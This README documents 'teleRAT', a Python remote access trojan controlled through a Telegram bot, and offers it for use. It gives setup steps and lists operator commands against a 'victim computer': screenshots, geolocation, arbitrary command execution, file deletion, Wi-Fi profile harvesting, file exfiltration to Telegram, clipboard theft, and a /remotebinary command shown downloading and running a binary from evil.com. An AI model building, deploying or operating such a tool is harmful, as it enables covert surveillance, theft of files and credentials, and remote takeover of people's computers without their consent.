# teleRAT

Python based RAT that uses Telegram for sending commands and receiving data to and from a victim computer.


# Setup.py

1. Insert your API key into the `api` variable inside the setup.py script & run it. This will setup your Telegram chat with your created bot with the necessary commands to avoid inserting each command along with the help message.
* Read [here](https://www.teleme.io/articles/create_your_own_telegram_bot?hl=en) to create your own bot and obtain your API token.

2. Install necessary requirements: `pip install -r requirements.txt`
3. Send a command to your Telegram bot
4. Run `python3 main.py`


## Available Commands

* **/whoami** - returns username. no additional arguments required.
* **/screenshot** - takes screenshots. requires the number of screenshots to take (EX: /screenshot 5 <- to take 5 screenshots)
* **/location** - returns location info (region, state, zip code, estimated coordinates, timezone, country, ip address)
* **/metadata** - returns metadata info about a specified file. requires filepath as an additional argument (EX: /metadata C:\Users\Username\Files\special.java <- will return metadata info about special.java)
* **/execute** - executes specified system command. requires 2 additional arguments: the system command and additional arguments to pass to that system command (EX: /execute cmd.exe [/c,ver] or /execute binary.exe none} in order to execute binary.exe with no arguments)
* **/power** - allows operator to shutoff, hibernate, or restart computer. requires 1 additional argument: hibernate, pd (to power down), or restart (EX: /power pd <- to power down the victim's computer)
* **/ls** - provides operator with directory listing. If no additional argument is provided, it provides directory listing for directory in which malware is. Additional argument of a directory is optional (EX: /ls %APPDATA% <- provides directory listing for APPDATA directory)
* **/delete** - deletes a user specified file. Additional argument of filepath is required (EX: /delete C:\Users\Username\Files\temp.txt <- deletes a file named temp.txt)
* **/wreport** - provides information regarding the wireless profiles the computer has connected to in the past, the drivers, and a list of wireless interfaces.
* **/remotebinary** - download and execute a remote binary. Requires 2 additional arguments: the URL where the binary is and any additional arguments to pass when executing the binary (EX: /remotebinary https://evil.com/file.exe noargs <- execute file.exe with no arguments or /remotebinary https://evil.com/file.exe [-c,-f] <- to execute file.exe with flags c & f)
* **/processes** - returns a list of running processes and services
* **/gather** - return a specified file. requires 1 additional argument: the filepath (EX: /gather C:\Users\username\important\file.xlsx <- grab and upload file.xlsx to Telegram chat)
* **/report** - provides a hardware report & Windows version to operator
* **/playnoise** - plays a user specified noise. available list of noises include: asterisk sound (asterisk), exclamation sound (exclamation), exit sound (exit), hand sound (hand), question sound (question), and beep (beep) (EX: /playnoise beep or /playnoise question)
* **/gatherclip** - returns data currently copied in the victim's clipboard. requires no additional arguments.
* **/messagebox** - will present the victim with a message box. 2 additional arguments are required: caption and title for the window (EX: /messagebox <text> <title>
